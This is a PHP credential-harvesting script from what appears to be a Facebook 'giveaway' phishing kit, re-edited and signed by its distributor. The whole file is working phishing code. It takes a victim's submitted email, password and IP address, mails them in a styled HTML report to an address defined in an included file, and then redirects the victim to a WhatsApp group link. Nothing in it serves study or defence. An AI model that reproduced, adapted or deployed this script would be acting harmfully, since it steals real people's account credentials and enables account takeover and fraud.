<!-- Reedit by Jefanya Efandchris
Don't change copyright, you are idiot -->

<?php
$user = $_POST['email'];
$pass = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];

$subject = "SETORAN FACEBOOK LAGI BOS";
$message = '
<center>
 <div style="background: url(https://coverfiles.alphacoders.com/431/43135.png) no-repeat center center fixed;border:2px solid black;background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" style="border-radius:8px; border:4px solid black; border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
    <tr>
      <th style="width:22%;height:25px;text-align:left;">Email</th>
      <th style="width:70%;text-align:center;">'.$user.'</th>
    </tr>
    <tr>
       <th style="width:22%;height:25px;text-align:left;">Pass</th>
      <th style="width:70%;text-align:center;">'.$pass.'</th>
    </tr>
    <tr>
       <th style="width:22%;height:25px;text-align:left;">IP</th>
      <th style="width:70%;text-align:center;">'.$ip.'</th>
    </tr>
  </table>
  <div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,gold,orange); color: black; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="font-weight:bold;font-size:15px;">&copy; JEFANYA EFANDCHRIS</div>
</div>
 <center>
';
include 'email.php';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: JEFANYA - FB GIVEAWAY V1 <result@jefanya.com>' . "\r\n";
$datamail = mail($pulberaja, $subject, $message, $headersx);
?>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/IHT9HZguYzE7CKEQC5Cjg7">
</head>
<body>
</body>
</html>